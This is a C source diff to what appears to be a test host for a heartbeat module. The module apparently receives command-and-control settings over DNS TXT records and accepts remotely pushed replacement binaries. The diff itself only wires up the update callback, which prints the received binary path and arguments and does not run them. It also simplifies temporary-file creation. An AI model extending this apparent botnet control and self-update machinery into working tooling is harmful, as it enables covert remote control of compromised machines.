@@ -50,6 +50,7 @@ static struct timespec proc_start;
 static uint8_t instance_id[16];
 static char hostcred[255];
 static size_t hostcred_len;
+static pth_t main_pth;
 
 static void init_htbthost_param (htbthost_param_t *p) {
 	p->verify = true;
@@ -107,24 +108,23 @@ static bool cb_hostinfo (prne_htbt_host_info_t *out) {
 	return true;
 }
 
-static bool cb_ny_bin (
-	const char *path,
-	const char *m_args,
-	const size_t m_args_size)
+static bool cb_ny_bin (const char *path, const prne_htbt_cmd_t *cmd)
 {
 	const size_t path_len = prne_nstrlen(path);
 
 	prne_dbgast(path_len > 0);
-	if (path_len + 1 > sizeof(m_nybin_path) || m_args_size > sizeof(m_nybin_args)) {
+	if (path_len + 1 > sizeof(m_nybin_path) ||
+		cmd->mem_len > sizeof(m_nybin_args))
+	{
 		errno = ENOMEM;
 		return false;
 	}
 
 	memcpy(m_nybin_path, path, path_len + 1);
-	memcpy(m_nybin_args, m_args, m_args_size);
-	m_nybin_args_size = m_args_size;
+	memcpy(m_nybin_args, cmd->mem, cmd->mem_len);
+	m_nybin_args_size = cmd->mem_len;
 
-	return true;
+	return pth_raise(main_pth, SIGTERM) != 0;
 }
 
 static void load_lbd_ssl_conf (
@@ -236,19 +236,8 @@ static bool parse_param (const char *arg) {
 
 static char *mktmpfile (size_t req_size, const mode_t mode) {
 	static int ctr = 0;
-	uint8_t *z = NULL;
-	size_t z_size;
-	ssize_t consume;
 	char *path = NULL, *ret = NULL;
 	int fd = -1, len;
-
-	z_size = prne_getpagesize();
-	z = prne_calloc(1, z_size);
-	if (z == NULL) {
-		z_size = 1;
-		z = prne_malloc(1, 1);
-		z[0] = 0;
-	}
 
 	len = snprintf(NULL, 0, "htbthost-tmp.%d", ctr);
 	if (len < 0) {
@@ -263,19 +252,14 @@ static char *mktmpfile (size_t req_size, const mode_t mode) {
 		goto END;
 	}
 
-	// TODO: Polyfill
 	fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, mode);
 	if (fd < 0) {
 		goto END;
 	}
 	fcntl(fd, F_SETFD, FD_CLOEXEC);
 
-	while (req_size > 0) {
-		consume = prne_op_min(z_size, req_size);
-		if (pth_write(fd, z, consume) != (int)consume) {
-			goto END;
-		}
-		req_size -= consume;
+	if (ftruncate(fd, (off_t)req_size) != 0) {
+		goto END;
 	}
 
 	ret = path;
@@ -287,8 +271,21 @@ END:
 	}
 	prne_free(path);
 	prne_close(fd);
-	prne_free(z);
 	return ret;
+}
+
+static void do_run_ny_bin (void) {
+	for (size_t i = 0; i < m_nybin_args_size; i += 1) {
+		if (m_nybin_args[i] == 0) {
+			m_nybin_args[i] = ' ';
+		}
+	}
+	m_nybin_args[m_nybin_args_size - 1] = 0;
+
+	printf(
+		"ny bin received:\n%s %s\n",
+		m_nybin_path,
+		m_nybin_args);
 }
 
 
@@ -317,7 +314,6 @@ int main (const int argc, const char **args) {
 	sigaddset(&ss_all, SIGTERM);
 	sigaddset(&ss_all, SIGINT);
 	sigaddset(&ss_all, SIGPIPE);
-	// sigaddset(&ss_all, SIGCHLD);
 	sigaddset(&ss_exit, SIGTERM);
 	sigaddset(&ss_exit, SIGINT);
 	assert(regcomp(
@@ -367,6 +363,7 @@ int main (const int argc, const char **args) {
 
 	mbedtls_debug_set_threshold(1);
 	pth_init();
+	main_pth = pth_self();
 
 	proc_start = prne_gettime(CLOCK_MONOTONIC);
 
@@ -435,9 +432,10 @@ int main (const int argc, const char **args) {
 		param.cncp_ssl_conf = &ssl.cncp.conf;
 		param.ctr_drbg = &rnd;
 		param.resolv = resolv;
-		param.cb_f.tmpfile = mktmpfile;
 		param.cb_f.cnc_txtrec = cb_txtrec;
 		param.cb_f.hostinfo = cb_hostinfo;
+		param.cb_f.tmpfile = mktmpfile;
+		param.cb_f.ny_bin = cb_ny_bin;
 
 		w = wkr_arr + 1;
 		htbt = prne_alloc_htbt(w, param);
@@ -478,6 +476,11 @@ int main (const int argc, const char **args) {
 	free_htbthost_param(&htbthost_param);
 	regfree(&re_ns4);
 	regfree(&re_ns6);
+
+	if (prne_nstrlen(m_nybin_path) > 0) {
+		do_run_ny_bin();
+		return 3;
+	}
 
 	return 0;
 }
